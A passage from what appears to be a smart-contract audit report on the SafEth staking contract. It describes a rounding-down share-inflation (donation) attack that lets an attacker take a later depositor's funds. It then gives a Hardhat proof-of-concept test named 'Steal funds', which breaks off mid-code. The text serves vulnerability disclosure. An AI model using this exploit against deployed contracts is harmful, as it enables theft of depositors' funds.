data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>can be very inaccurate. In the worst case it rounds down to 0 for users that deposit value that is less than the value that the attacker transferred in.</p>\n<p>In the following POC the attacker steals all of the second user’s deposit. The attacker first deposits 100 ETH and immediately removes all but 1 wei. The attacker then transfers 10 wsETH to the WstEth contract. When the second user enters with 1.5 ETH no additional safETH are minted since the minAmount is rounded down to 0. The attacker has all of the safTokens and can withdraw 100% of deposits.</p>\n<p>Create a new test file with the following content to run the POC.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../typechain-types&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">upgrades</span><span class=\"mtk1\">, </span><span class=\"mtk12\">network</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;chai&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">getAdminAccount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">getUserAccounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">getUserBalances</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">randomStakes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">randomUnstakes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./helpers/integrationHelpers&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">getLatestContract</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./helpers/upgradeHelpers&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">BigNumber</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;ethers&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/build/contracts/ERC20.json&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">RETH_MAX</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WSTETH_ADRESS</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WSTETH_WHALE</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./helpers/constants&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">describe</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SafEth POC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthContractAddress</span><span class=\"mtk1\">: </span><span class=\"mtk10\">string</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategyContractAddress</span><span class=\"mtk1\">: </span><span class=\"mtk10\">string</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// create string array</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativesAddress</span><span class=\"mtk1\">: </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[] = [];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startingBalances</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\">[];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">networkFeesPerAccount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\">[];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalStakedPerAccount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\">[];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">before</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">startingBalances</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getUserBalances</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">networkFeesPerAccount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startingBalances</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">(() </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BigNumber</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalStakedPerAccount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startingBalances</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">(() </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BigNumber</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Should deploy the strategy contract&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SafEth&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\"> = (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">upgrades</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safEthFactory</span><span class=\"mtk1\">, [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Asymmetry Finance ETH&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;safETH&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ])) </span><span class=\"mtk15\">as</span><span class=\"mtk1\"> </span><span class=\"mtk10\">SafEth</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategyContractAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">derivativeCount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">((</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getAdminAccount</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Should deploy derivative contracts and add them to the strategy contract with equal weights&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supportedDerivatives</span><span class=\"mtk1\"> = [</span><span class=\"mtk8\">&quot;Reth&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;SfrxEth&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;WstEth&quot;</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getLatestContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategyContractAddress</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;SafEth&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">supportedDerivatives</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">supportedDerivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">upgrades</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeFactory</span><span class=\"mtk1\">, [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">strategyContractAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">derivativesAddress</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx1</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addDerivative</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;1000000000000000000&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">derivativeCount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedDerivatives</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Steal funds&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getLatestContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategyContractAddress</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;SafEth&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getUserAccounts</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BigNumber</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userStrategySigner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userStrategySigner2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;100&quot;</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeResult</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userStrategySigner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stake</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mined</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeResult</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">networkFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mined</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gasUsed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mined</span><span class=\"mtk1\">.</span><span class=\"mtk12\">effectiveGasPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">networkFeesPerAccount</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">networkFeesPerAccount</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">networkFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalStakedPerAccount</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">totalStakedPerAccount</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userSfEthBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userSfWithdraw</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userSfEthBalance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span 